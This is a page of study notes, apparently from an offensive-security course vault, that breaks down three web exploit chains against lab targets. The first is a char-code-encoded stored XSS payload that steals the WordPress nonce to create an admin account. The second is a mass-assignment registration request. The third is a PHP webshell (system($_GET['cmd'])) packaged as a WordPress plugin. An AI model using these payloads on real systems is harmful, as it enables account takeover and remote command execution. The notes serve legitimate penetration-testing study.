# Web Applications — Command Breakdowns

Part of [[COMMAND BREAKDOWNS]]. CMS-specific and API-specific exploit chains that are condensed enough to look like line noise. See that page for the entry format.

---

## Nonce theft + `eval(String.fromCharCode(...))`: stored XSS to WordPress admin account

**Full payload delivery:**
```bash
curl -i http://offsecwp --user-agent "<script>eval(String.fromCharCode(<encoded_values_here>))</script>" --proxy 127.0.0.1:8080
```
built from this JS, minified and char-code-encoded before delivery:
```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

**Piece by piece:** this is a multi-stage chain condensed into one delivery mechanism, worth separating into what it does versus how it's smuggled.

*What it does, conceptually:*
- The stored XSS payload doesn't try to steal a session cookie (WordPress marks its auth cookies `HttpOnly`, JavaScript can't read them at all). Instead, it runs *inside the admin's own already-authenticated browser session* and uses that session to act on the attacker's behalf, cookie theft was never necessary.
- `new XMLHttpRequest()` to `/wp-admin/user-new.php`, `open(..., false)` → a **synchronous** (blocking) GET request, made from inside the victim admin's browser, which means it's sent with the admin's own session cookies automatically attached, no theft needed, the browser does it for you.
- `nonceRegex = /ser" value="([^"]*?)"/g` → scrapes WordPress's own CSRF-protection token (a "nonce," a per-request random value) directly out of the HTML the admin's browser just fetched. The pattern deliberately matches partial text (`ser"` rather than the full `user"`) so it matches regardless of whether the surrounding HTML attribute is `User"` or `user"`, a small case-insensitivity hack via partial matching instead of a regex flag.
- Why a nonce doesn't stop this at all → a nonce defeats *blind* CSRF (tricking a victim into submitting a forged request they never see). It does nothing against an attack running *inside* the victim's own browser, which can simply fetch a fresh, completely legitimate nonce for itself before acting, exactly like a real logged-in user would.
- The second (not shown above, but chained after) POST to the same `user-new.php` endpoint uses that stolen nonce to create a new `administrator`-role account, again riding the admin's own session.

*How it's smuggled:*
- Minified first (to fit in a single header value), then run through a char-code encoder (`charCodeAt` per character) to turn the entire script into a comma-separated list of numbers.
- `<script>eval(String.fromCharCode(<encoded_values_here>))</script>` → `String.fromCharCode()` reconstructs the original string from those numbers at runtime in the victim's browser, and `eval()` executes the reconstructed string as JavaScript. This encoding exists because the delivery vector is an HTTP header (`User-Agent`), and raw script text full of quotes/angle-brackets/slashes is fragile to smuggle through a header value and whatever the app does when it stores/re-renders it, a flat list of numbers has none of those problematic characters.
- `--user-agent "..."` → the actual injection point, a stored-XSS field (WordPress's Visitors plugin logs and later re-displays the User-Agent header unsanitized), so the payload only fires later, whenever an admin views that plugin's dashboard.

**Where this comes from:** the nonce-theft-via-synchronous-XHR pattern is a well-documented WordPress attack chain, HackTricks' WordPress pentesting page covers nonce/CSRF bypass via stored XSS explicitly. CyberChef's "To Charcode"/"From Charcode" recipe operations do the same encode/decode step shown here without writing custom JS. PayloadsAllTheThings' XSS cheat sheet has more `eval(String.fromCharCode(...))`-style delivery variants for different injection contexts.

**Where to look in the response:** there's nothing to grep in an HTTP response for this one, the payload only proves itself out-of-band. Confirmation is logging in as the real admin, opening the vulnerable plugin's dashboard (which triggers stored execution), then checking **Users** in the WordPress sidebar for the new `attacker` account with role `administrator`.

🔁 **Seen in:** [[Introduction to Web Application Attacks#8.4.5. Privilege Escalation via XSS|Introduction to Web Application Attacks, 8.4.5]].

#### Tags: #XSS #WordPressNonce #CSRF #EvalExploit #CommandBreakdowns

---

## Mass-assignment registration payload (undocumented `admin` field)

**Full command:**
```bash
curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' \
  -H 'Content-Type: application/json' \
  http://192.168.50.16:5002/users/v1/register
```

**Piece by piece:**
- The visible/expected fields (`password`, `username`, `email`) → this is the legitimate, documented shape of a registration request, the kind you'd see just by testing the form normally.
- `"admin":"True"` → the entire exploit, and the reason this is worth a breakdown at all: **nothing about this field is documented, discoverable from the app's UI, or hinted at by any error message.** It's a guess based on the vulnerability *class* (mass assignment / over-posting), not a value read off the page. The reasoning: if a backend blindly maps every key in a JSON request body onto a database record's fields (a common shortcut in quickly-built REST APIs, e.g. Flask/SQLAlchemy patterns that auto-map request JSON to a model), then any field that exists as a column but isn't explicitly filtered out of the *input* side becomes attacker-controllable, even if the UI never exposes a way to set it.
- Why `"True"` (capitalized) specifically, not `true` → this particular API happens to be Python-backed (Flask), where `True` is the literal boolean spelling, a hint from the target's tech stack (identified via earlier fingerprinting) about which capitalization is likely to actually parse as a boolean rather than a harmless string.
- No error response on submission → the tell that it worked. A backend that validates its input schema strictly would reject or silently drop an unrecognized field, getting back a normal success response (rather than a validation error) is itself the signal that the extra field was accepted.

**Where this comes from:** this is the textbook example of the OWASP "Mass Assignment" vulnerability class (part of the OWASP API Security Top 10). HackTricks' API pentesting methodology page and PayloadsAllTheThings' API Security checklist both cover the general technique: once you've mapped an object's *visible* fields, try adding plausible hidden/privileged field names (`admin`, `role`, `isAdmin`, `verified`) to a write request and see if any get silently accepted.

**Where to look in the response:** don't look for a specific value in this response, look for the *absence* of a rejection. Confirm the field actually took effect by logging in as the new account afterward and checking whether it has elevated access (in this case, the ability to overwrite another user's password via a `PUT` request that would otherwise require admin auth).

🔁 **Seen in:** [[Introduction to Web Application Attacks#8.3.3. Enumerating and Abusing APIs|Introduction to Web Application Attacks, 8.3.3]], Step 5.

#### Tags: #MassAssignment #RESTAPI #APIEnumeration #CommandBreakdowns

---

## WordPress plugin-header comment block as machine-readable metadata

**Full command:**
```bash
cat > /tmp/shell/shell.php << 'EOF'
<?php
/*
Plugin Name: shell
*/
system($_GET['cmd']);
EOF
cd /tmp && zip -r shell.zip shell
```

**Piece by piece:**
- `/* Plugin Name: shell */` → looks like a decorative comment, but it's structurally load-bearing. WordPress's plugin loader **parses PHP comment headers as structured metadata** to populate the Plugins admin screen (name, version, author, description all follow this same `Key: Value` inside a top-of-file comment block convention). Without a recognized `Plugin Name:` line, WordPress won't treat the uploaded zip as an installable plugin at all, it'll just be an inert zip file sitting in the uploads directory.
- `system($_GET['cmd'])` outside the comment block → this is the actual payload, plain unauthenticated command execution via a `cmd` GET parameter, same pattern as every other webshell in this vault. It sits completely unprotected by any hook or authentication check, meaning once the plugin is active, it fires on every single page load, not just a specific admin-triggered action.
- Why it has to be zipped into a subdirectory (`shell/shell.php`, not just `shell.php` at the zip root) → WordPress's plugin uploader expects a specific structure, either a single top-level `.php` file or (as here) a folder containing the plugin's files, mirroring how real plugins are distributed. Zipping the bare file at the root without a containing folder can cause the upload to be accepted differently or rejected, matching the expected folder-per-plugin convention avoids that ambiguity.
- Why this delivery path exists at all (rather than just editing `404.php` via the Theme File Editor) → WordPress's built-in fatal-error-protection feature does a **loopback check** before saving a Theme/Plugin Editor change (it tries to re-request the site to confirm the edit didn't break it), which fails hard on isolated lab networks where the server can't reach its own hostname. Plugin *upload* has no such loopback check at install time, sidestepping that failure entirely.

**Where this comes from:** the WordPress Plugin Handbook documents the required header comment format for any plugin file (`developer.wordpress.org`, "Plugin Header Requirements"). This specific admin-to-RCE-via-plugin-upload technique (as a fallback when Theme Editor fails) is a commonly documented WordPress post-exploitation pattern, covered on HackTricks' WordPress page under privilege-escalation-to-RCE methods.

**Where to look in the response:** after activation, hit the plugin's exec parameter directly and look for command output in the raw response body (no wrapping, e.g. `curl "http://<target>/?cmd=id"` returning `uid=33(www-data)...` directly), confirming the plugin is both installed and actively executing on every page load as expected.

🔁 **Seen in:** [[SQL Injection Attacks#🏆 Capstone Labs|SQL Injection Attacks, Capstone VM #1]], Step 10. Companion entry in [[COMMAND APPENDIX/Web Applications|Command Appendix]].

#### Tags: #WordPress #PluginRCE #AdminToRCE #CommandBreakdowns

---

## **Outstanding**
- [ ] WordPress `admin-ajax.php` unauthenticated SQLi routing (why every plugin action shares one endpoint), phpass hash format.
